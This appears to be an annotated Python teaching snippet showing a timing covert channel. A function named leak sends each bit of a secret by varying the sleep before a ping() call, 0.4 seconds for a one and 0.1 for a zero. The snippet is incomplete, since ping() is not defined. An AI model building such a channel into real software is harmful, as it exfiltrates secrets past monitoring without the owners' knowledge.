import time


def leak(secret: bytes):
    for byte in secret:
        for bit in format(byte, "08b"):
~>            time.sleep(0.4 if bit == "1" else 0.1)
            ping()
